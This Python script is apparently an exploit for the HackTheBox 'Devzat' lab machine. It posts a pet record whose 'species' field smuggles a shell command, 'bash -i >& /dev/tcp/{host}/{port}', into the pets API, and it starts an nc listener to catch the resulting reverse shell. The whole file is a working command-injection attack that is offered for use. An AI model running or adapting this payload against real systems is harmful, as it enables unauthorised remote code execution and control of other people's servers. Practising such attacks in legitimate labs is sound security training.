#!/usr/bin/python3

import sys, signal, requests, argparse, subprocess, threading
try:
	import netifaces
except:
	print("[*] Installing netifaces lib...")
	result = subprocess.run(['python3', '-m', 'pip', 'install', 'netifaces'], capture_output=True)
	import netifaces

def def_handler(signum, frame):
	print("\n\n[*] Exiting...\n")
	sys.exit()

def args_():
	parser = argparse.ArgumentParser()
	parser.add_argument("interface", help="Your hackthebox interface")
	parser.add_argument("port", help="Port to receive the reverse shell")

	return parser.parse_args()

def initArgs():
	args = args_()
	interface = args.interface
	port = args.port
	return interface, port

def getHost(interface):
	host = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
	print(f"[*] Your HackTheBox IP: {host}")
	return host

def spawnShell(port):
	subprocess.run(['nc', '-lvnp', port])

def sendPayload(host, port):
	payload = f"cat;bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
	target_url = "http://pets.devzat.htb/api/pet"
	s = requests.session()

	header = {
		"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
	}
	data = {
			"name" : "c0rnf13ld",
			"species" : payload
		}

	threading.Thread(target=spawnShell, args=(port,), daemon=True).start()
	r = s.post(target_url, json=data, headers=header)

def main():
	interface, port = initArgs()
	host = getHost(interface)
	sendPayload(host, port)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
	main()